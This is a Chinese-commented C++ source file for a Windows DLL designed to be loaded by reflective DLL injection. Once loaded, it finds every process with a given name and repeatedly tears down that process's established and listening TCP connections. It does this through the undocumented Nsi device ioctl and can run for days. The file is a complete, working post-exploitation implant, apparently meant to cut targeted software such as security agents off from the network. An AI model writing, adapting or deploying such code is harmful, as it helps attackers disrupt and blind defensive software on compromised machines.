// 必须在最开始定义，在包含任何头文件之前
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_    // 防止 winsock.h 被包含

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <string>
#include "RLoader.h"
#include <tlhelp32.h>
#include <shellapi.h>

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

typedef LONG NTSTATUS;

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

extern HINSTANCE hAppInstance;

BOOL ifDebug = true;
void DebugLog(const char* format, ...) {
    if (ifDebug) {
        char buffer[1024];
        va_list args;
        va_start(args, format);
        vsnprintf_s(buffer, sizeof(buffer), _TRUNCATE, format, args);
        va_end(args);

        OutputDebugStringA(buffer);
        HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\reflective_debug.log",
            GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            SetFilePointer(hFile, 0, NULL, FILE_END);
            DWORD written;
            WriteFile(hFile, buffer, (DWORD)strlen(buffer), &written, NULL);
            WriteFile(hFile, "\r\n", 2, &written, NULL);
            CloseHandle(hFile);
        }
    }
    else {
        return;
    }
}

// 定义TCP Killer参数结构体
typedef struct _TCP_KILLER_PARAMS {
    WCHAR szProcessName[MAX_PATH];
    DWORD dwKillInterval;
    DWORD dwDuration;
} TCP_KILLER_PARAMS, * PTCP_KILLER_PARAMS;

// 全局变量
std::string szargs;
std::wstring wszargs;
int argc = 0;
LPWSTR* argv = NULL;
HANDLE g_hThread = NULL;
BOOL g_bRunning = FALSE;
BOOL g_infinite;
TCP_KILLER_PARAMS g_KillerParams = { 0 };

// 自定义IO_STATUS_BLOCK
typedef struct _MY_IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} MY_IO_STATUS_BLOCK, * PMY_IO_STATUS_BLOCK;

// 函数类型定义
typedef NTSTATUS(WINAPI* NtDeviceIoControlFile_t)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PMY_IO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength);

typedef NTSTATUS(WINAPI* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef ULONG(WINAPI* RtlNtStatusToDosError_t)(
    NTSTATUS Status);

// 函数指针 - 移到类型定义之后
NtDeviceIoControlFile_t pNtDeviceIoControlFile = NULL;
NtWaitForSingleObject_t pNtWaitForSingleObject = NULL;
RtlNtStatusToDosError_t pRtlNtStatusToDosError = NULL;

// NSI结构
typedef struct _NSI_SET_PARAMETERS_EX {
    PVOID Reserved0;
    PVOID Reserved1;
    PVOID ModuleId;
    DWORD IoCode;
    DWORD Unused1;
    DWORD Param1;
    DWORD Param2;
    PVOID InputBuffer;
    DWORD InputBufferSize;
    DWORD Unused2;
    PVOID MetricBuffer;
    DWORD MetricBufferSize;
    DWORD Unused3;
} NSI_SET_PARAMETERS_EX;

struct TcpKillParamsIPv4 {
    WORD  localAddrFamily;
    WORD  localPort;
    DWORD localAddr;
    BYTE  reserved1[20];
    WORD  remoteAddrFamily;
    WORD  remotePort;
    DWORD remoteAddr;
    BYTE  reserved2[20];
};

// TCP模块ID
BYTE NPI_MS_TCP_MODULEID[] = {
    0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
    0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
};

// NSI设备句柄
static HANDLE g_hNsiDevice = INVALID_HANDLE_VALUE;

std::wstring StringToWString(const std::string& str)
{
    int num = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    wchar_t* wide = new wchar_t[num];
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, wide, num);
    std::wstring w_str(wide);
    delete[] wide;
    return w_str;
}

// 初始化函数指针
bool InitializeAPIs() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    pNtDeviceIoControlFile = (NtDeviceIoControlFile_t)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
    pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pRtlNtStatusToDosError = (RtlNtStatusToDosError_t)GetProcAddress(hNtdll, "RtlNtStatusToDosError");

    return pNtDeviceIoControlFile && pNtWaitForSingleObject && pRtlNtStatusToDosError;
}

HANDLE GetNsiDevice() {
    if (g_hNsiDevice == INVALID_HANDLE_VALUE) {
        g_hNsiDevice = CreateFileW(L"\\\\.\\Nsi", 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    return g_hNsiDevice;
}

ULONG NsiIoctl(DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize,
    LPVOID lpOutBuffer, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped) {

    HANDLE hDevice = GetNsiDevice();
    if (hDevice == INVALID_HANDLE_VALUE)
        return GetLastError();

    if (lpOverlapped) {
        if (!DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize,
            lpOutBuffer, *lpBytesReturned, lpBytesReturned, lpOverlapped)) {
            return GetLastError();
        }
        return 0;
    }

    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!hEvent) return GetLastError();

    MY_IO_STATUS_BLOCK ioStatus;
    ZeroMemory(&ioStatus, sizeof(ioStatus));

    NTSTATUS status = pNtDeviceIoControlFile(
        hDevice, hEvent, NULL, NULL, &ioStatus,
        dwIoControlCode, lpInBuffer, nInBufferSize,
        lpOutBuffer, *lpBytesReturned
    );

    if (status == STATUS_PENDING) {
        status = pNtWaitForSingleObject(hEvent, FALSE, NULL);
        if (NT_SUCCESS(status))
            status = ioStatus.Status;  // 直接访问Status，因为它是匿名union
    }

    CloseHandle(hEvent);
    if (!NT_SUCCESS(status))
        return pRtlNtStatusToDosError(status);

    *lpBytesReturned = (DWORD)ioStatus.Information;
    return 0;
}

ULONG MyNsiSetAllParameters(DWORD a1, DWORD a2, PVOID pModuleId, DWORD dwIoCode,
    PVOID pInputBuffer, DWORD cbInputBuffer, PVOID pMetricBuffer, DWORD cbMetricBuffer) {

    NSI_SET_PARAMETERS_EX params;
    ZeroMemory(&params, sizeof(params));
    DWORD cbReturned = sizeof(params);

    params.ModuleId = pModuleId;
    params.IoCode = dwIoCode;
    params.Param1 = a1;
    params.Param2 = a2;
    params.InputBuffer = pInputBuffer;
    params.InputBufferSize = cbInputBuffer;
    params.MetricBuffer = pMetricBuffer;
    params.MetricBufferSize = cbMetricBuffer;

    return NsiIoctl(0x120013, &params, sizeof(params), &params, &cbReturned, NULL);
}

DWORD MySetTcpEntry(MIB_TCPROW_OWNER_PID* pTcpRow) {
    TcpKillParamsIPv4 params;
    ZeroMemory(&params, sizeof(params));

    params.localAddrFamily = AF_INET;
    params.localPort = (WORD)pTcpRow->dwLocalPort;
    params.localAddr = pTcpRow->dwLocalAddr;
    params.remoteAddrFamily = AF_INET;
    params.remotePort = (WORD)pTcpRow->dwRemotePort;
    params.remoteAddr = pTcpRow->dwRemoteAddr;

    return MyNsiSetAllParameters(1, 2, (LPVOID)NPI_MS_TCP_MODULEID, 16,
        &params, sizeof(params), NULL, 0);
}

// 自定义宽字符串比较(不区分大小写)
int MyWcsicmp(const WCHAR* s1, const WCHAR* s2) {
    while (*s1 && *s2) {
        WCHAR c1 = *s1;
        WCHAR c2 = *s2;

        if (c1 >= L'a' && c1 <= L'z') c1 -= 32;
        if (c2 >= L'a' && c2 <= L'z') c2 -= 32;

        if (c1 != c2) {
            return (int)(c1 - c2);
        }
        s1++;
        s2++;
    }
    return (int)(*s1 - *s2);
}

// 通过进程名获取PID
void GetPidsByProcessName(const WCHAR* processName, DWORD* pidArray, DWORD* count, DWORD maxCount) {
    *count = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snapshot, &pe)) {
        do {
            if (MyWcsicmp(processName, pe.szExeFile) == 0) {
                if (*count < maxCount) {
                    pidArray[(*count)++] = pe.th32ProcessID;
                }
            }
        } while (Process32NextW(snapshot, &pe));
    }

    CloseHandle(snapshot);
}

// 关闭指定PID的TCP连接
void CloseTcpConnectionsByPid(DWORD pid) {
    DWORD size = 0;
    DWORD result;
    struct in_addr IpAddr;
    char szLocalAddr[128];
    char szRemoteAddr[128];

    result = GetExtendedTcpTable(NULL, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (result != ERROR_INSUFFICIENT_BUFFER) {
        return;
    }

    PMIB_TCPTABLE_OWNER_PID tcpTable = (PMIB_TCPTABLE_OWNER_PID)HeapAlloc(GetProcessHeap(), 0, size);
    if (!tcpTable) {
        return;
    }

    if (GetExtendedTcpTable(tcpTable, &size, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        for (DWORD i = 0; i < tcpTable->dwNumEntries; ++i) {
            MIB_TCPROW_OWNER_PID* row = &tcpTable->table[i];
            if (row->dwOwningPid == pid && row->dwState == MIB_TCP_STATE_ESTAB) {
                DebugLog("[+] Killing TCP connection for PID %d", pid);
                
                IpAddr.S_un.S_addr = (u_long)tcpTable->table[i].dwRemoteAddr;
                strcpy_s(szRemoteAddr, sizeof(szRemoteAddr), inet_ntoa(IpAddr));
                DebugLog("\tTCP[%d] Remote Addr: %s", i, szRemoteAddr);
                DebugLog("\tTCP[%d] Remote Port: %d \n", i, ntohs((u_short)tcpTable->table[i].dwRemotePort));
                
                row->dwState = MIB_TCP_STATE_DELETE_TCB;
                MySetTcpEntry(row);
            }

            if (row->dwOwningPid == pid && row->dwState == MIB_TCP_STATE_LISTEN) {
                DebugLog("[+] Killing TCP Listening Port for PID %d", pid);

                IpAddr.S_un.S_addr = (u_long)tcpTable->table[i].dwLocalAddr;
                strcpy_s(szLocalAddr, sizeof(szLocalAddr), inet_ntoa(IpAddr));
                DebugLog("\tTCP[%d] Local Addr: %s", i, szLocalAddr);
                DebugLog("\tTCP[%d] Local Port: %d \n", i, ntohs((u_short)tcpTable->table[i].dwLocalPort));

                row->dwState = MIB_TCP_STATE_DELETE_TCB;
                MySetTcpEntry(row);
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, tcpTable);
}

// 工作线程
DWORD WINAPI TcpKillerThread(LPVOID lpParam) {
    PTCP_KILLER_PARAMS pParams = (PTCP_KILLER_PARAMS)lpParam;
    if (!pParams) {
        DebugLog("[-] Invalid parameters");
        return 0;
    }

    if (!(pParams->dwKillInterval) || !(pParams->dwDuration)) {
        DebugLog("[-] No dwKillInterval or dwDuration");
        return 0;
    }

    DebugLog("[+] TcpKiller thread started for process: %S", pParams->szProcessName);
    DebugLog("[+] Kill interval: %d ms, Duration: %d seconds",
        pParams->dwKillInterval, pParams->dwDuration);

    DWORD dwStartTime = GetTickCount();
    DWORD pidArray[100];
    DWORD pidCount;

    while (g_bRunning) {
        if (pParams->dwDuration > 0) {
            DWORD dwElapsed = (GetTickCount() - dwStartTime) / 1000;
            if (dwElapsed >= pParams->dwDuration) {
                DebugLog("[+] Duration reached, stopping...");
                break;
            }
        }

        GetPidsByProcessName(pParams->szProcessName, pidArray, &pidCount, 100);

        if (pidCount > 0) {
            DebugLog("[+] Found %d instances of %S", pidCount, pParams->szProcessName);
            for (DWORD i = 0; i < pidCount; i++) {
                CloseTcpConnectionsByPid(pidArray[i]);
            }
        }
        else {
            DebugLog("[-] No process found!");
        }

        //DebugLog("[!] Start Sleeping %d ms...", pParams->dwKillInterval);
        Sleep(pParams->dwKillInterval);
    }

    DebugLog("[+] TcpKiller thread stopped");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DebugLog("==========================================");
        DebugLog("[+] DllMain called with DLL_PROCESS_ATTACH");
        /*MessageBoxA(NULL, "DllMain called", "Debug", MB_OK);*/

        // 将hModule保存到hAppInstance
        hAppInstance = hModule;

        if (lpReserved != NULL) {
            szargs = (PCHAR)lpReserved;
            DebugLog("[+] Received args: %s", szargs.c_str());
            wszargs = StringToWString(szargs);
            argv = CommandLineToArgvW(wszargs.data(), &argc);
        }

        if (argv == NULL || argc < 3) {
            printf("[-] Arguments parsing failed!\n");
            printf("[-] Usage: <process_name> <interval_ms> <duration_sec>\n");
            printf("[-] Example: chrome.exe 60\n");
            fflush(stdout);
            fflush(stderr);
            break;

            // 使用默认参数
            /*wcscpy_s(g_KillerParams.szProcessName, MAX_PATH, L"chrome.exe");
            g_KillerParams.dwKillInterval = 1000;
            g_KillerParams.dwDuration = 0;*/
        }
        else {
            DebugLog("[+] Starting TCP Killer with args:");
            DebugLog("    Process: %S", argv[0]);
            DebugLog("    Interval: %S ms", argv[1]);
            DebugLog("    Duration: %S seconds", argv[2]);

            // 解析参数
            wcscpy_s(g_KillerParams.szProcessName, MAX_PATH, argv[0]);
            g_KillerParams.dwKillInterval = _wtoi(argv[1]);
            g_KillerParams.dwDuration = _wtoi(argv[2]);

            // 参数验证
            if (g_KillerParams.dwKillInterval < 1000) {
                g_KillerParams.dwKillInterval = 1000;
            }

            if (g_KillerParams.dwDuration >= 0) {
                if (g_KillerParams.dwDuration == 0) {
                    g_infinite = true;
                }
            }
            else {
                DebugLog("[+] Invalid param Duration --> %d", g_KillerParams.dwDuration);
                break;
            }
        }

        if (InitializeAPIs()) {
            DebugLog("[+] APIs initialized successfully");

            // 启动工作线程
            g_bRunning = TRUE;
            g_hThread = CreateThread(NULL, 0, TcpKillerThread, &g_KillerParams, 0, NULL);

            if (g_hThread) {
                DebugLog("[+] Worker thread created successfully");

                if (!g_infinite) {
                    //DebugLog("[!] Main process: start sleeping %d s for waiting thread...", g_KillerParams.dwDuration);
                    printf("\t[!] TcpKiller: Main process: start sleeping %d s for waiting thread...", g_KillerParams.dwDuration);
                    fflush(stdout);
                    fflush(stderr);
                    Sleep((g_KillerParams.dwDuration + 5) * 1000);
                }
                else {
                    //DebugLog("[!] Main process: execute infinitely");
                    printf("\t[!] TcpKiller: Main process: execute infinitely");
                    fflush(stdout);
                    fflush(stderr);
                    // 3 days
                    Sleep(3 * 24 * 60 * 60 * 1000);
                }
            }
            else {
                printf("\t[-] TcpKiller: Failed to create worker thread: %d", GetLastError());
                fflush(stdout);
                fflush(stderr);
            }
        }
        else {
            printf("\t[-] TcpKiller: Failed to initialize APIs");
            fflush(stdout);
            fflush(stderr);
        }

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        DebugLog("[+] DllMain called with DLL_THREAD_DETACH");
        break;

    case DLL_PROCESS_DETACH:
        DebugLog("[+] DllMain called with DLL_PROCESS_DETACH");
        if (g_bRunning) {
            g_bRunning = FALSE;
            if (g_hThread) {
                WaitForSingleObject(g_hThread, 5000);
                CloseHandle(g_hThread);
                g_hThread = NULL;
            }
        }

        if (g_hNsiDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(g_hNsiDevice);
            g_hNsiDevice = INVALID_HANDLE_VALUE;
        }

        if (argv) {
            LocalFree(argv);
            argv = NULL;
        }
        break;
    }
    return TRUE;
}